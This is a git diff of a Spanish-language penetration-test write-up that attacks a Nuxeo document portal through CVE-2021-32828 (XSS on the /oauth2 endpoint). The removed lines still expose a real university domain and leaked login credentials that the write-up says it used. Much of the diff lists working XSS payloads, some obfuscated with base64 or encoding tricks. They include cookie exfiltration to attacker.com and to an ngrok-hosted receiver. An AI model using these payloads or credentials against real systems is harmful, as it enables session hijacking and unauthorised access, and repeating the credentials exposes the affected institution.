@@ -2,9 +2,9 @@
 
 ### 1. Acceso inicial a la plataforma
 
-Se accedió al portal institucional de Nuxeo mediante la siguiente URL:
+Se accedió al portal de Nuxeo mediante la siguiente URL:
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/login.jsp?requestedUrl=ui%2F
+https://<PortalNuxeo>/nuxeo/login.jsp?requestedUrl=ui%2F
 ```
 Allí se cargó correctamente la interfaz gráfica de inicio de sesión de Nuxeo.
 
@@ -13,8 +13,8 @@ Allí se cargó correctamente la interfaz gráfica de inicio de sesión de Nuxeo
 
 Se utilizaron credenciales filtradas y aún válidas para iniciar sesión:
 
-- **Usuario:** desarrollooas  
-- **Contraseña:** desarrollooas2019
+- **Usuario:** usuario  
+- **Contraseña:** usuario2019
 
 El navegador (Google Chrome) advirtió que dichas credenciales han sido comprometidas en filtraciones previas.
 
@@ -36,7 +36,7 @@ Aunque no se logró identificar con exactitud la versión del sistema, se realiz
 /nuxeo/site/oauth2/
 ```
 
-OAuth (Open Authorization) es un protocolo estándar que permite a las aplicaciones obtener acceso limitado a cuentas de usuario sin exponer las credenciales.
+**OAuth (Open Authorization)** es un protocolo estándar que permite a las aplicaciones obtener acceso limitado a cuentas de usuario sin exponer las credenciales.
 
 ![Enumeración de directorios relevantes]
 <img width="1164" height="658" alt="image" src="https://github.com/user-attachments/assets/368b467e-d574-4ccf-90ae-74314197e228" />
@@ -51,7 +51,7 @@ Con base en los resultados anteriores, se investigaron vulnerabilidades conocida
 - **CVE-2021-32828**: En versiones anteriores a la 11.5.109, la API REST `/oauth2` de Nuxeo es vulnerable a ataques de **Cross-Site Scripting (XSS)**. Este ataque puede ser escalado a **Remote Code Execution (RCE)** mediante el uso de la API de automatización.
 
 **Referencia oficial:**
-https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo
+**https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo**
 
 ![Referencia CVE]
 <img width="1282" height="772" alt="image" src="https://github.com/user-attachments/assets/f50e3af5-ca7f-4186-9b2c-9118fa46730e" />
@@ -68,7 +68,7 @@ https://securitylab.github.com/advisories/GHSL-2021-072-nuxeo
 
 Se probó un payload XSS clásico apuntando directamente al endpoint vulnerable:
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src%20onerror=alert(document.domain)%3E/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src%20onerror=alert(document.domain)%3E/callback
 ```
 
 El resultado fue exitoso, mostrando una alerta con el dominio del sitio.
@@ -112,28 +112,28 @@ Se exploraron varias técnicas para evadir filtros o mejorar la ejecución del c
 
 **Payload 4: script tag directo**
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<script>alert(1)</script>/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/<script>alert(1)</script>/callback
 ```
 
 **Payload 5: Codificación hexadecimal en el evento**
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<img src=x o%6Eerror=alert(1)>/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x o%6Eerror=alert(1)>/callback
 ```
 
 **Payload 6: Comentario HTML para evadir detección**
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<img src=x onerror=eval/--/(atob("YWxlcnQoMSk="))>/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=eval/--/(atob("YWxlcnQoMSk="))>/callback
 ```
 > alert(1)
 
 **Payload 7: Exfiltración con location.href**
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<img src=x onerror=location.href='https://attacker.com?c='+document.cookie>/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=location.href='https://attacker.com?c='+document.cookie>/callback
 ```
 
 **Payload 8: Interacción con DOM**
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/<img src=x onerror=alert(document.body.innerHTML)>/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/<img src=x onerror=alert(document.body.innerHTML)>/callback
 ```
 
 De todas las pruebas, los payloads exitosos fueron:
@@ -178,8 +178,15 @@ python3 -m http.server 80
 
 Se ejecutó el siguiente payload XSS que realiza una petición hacia el servidor controlado por el atacante:
 ```
-https://documental.portaloas.udistrital.edu.co/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly9hNTZmYWE1ZDcyYjIubmdyb2stZnJlZS5hcHAvbG9nP2M9Iitkb2N1bWVudC5jb29raWU7%22))%3E/callback
+https://<PortalNuxeo>/nuxeo/site/oauth2/%3Cimg%20src=x%20onerror=eval(atob(%22aT1uZXcgSW1hZ2UoKTtpLnNyYz0iaHR0cHM6Ly9hNTZmYWE1ZDcyYjIubmdyb2stZnJlZS5hcHAvbG9nP2M9Iitkb2N1bWVudC5jb29raWU7%22))%3E/callback
 ```
+_________________________________________________
+
+Hubo una situacion particular a la hora de hacer que funcionara el payload
+
+
+_________________________________________________
+
 
 ![Payload XSS apuntando al servidor atacante]
 <img width="1919" height="206" alt="image" src="https://github.com/user-attachments/assets/90b149e2-0d71-47cb-8cdf-4ca797f12c26" />
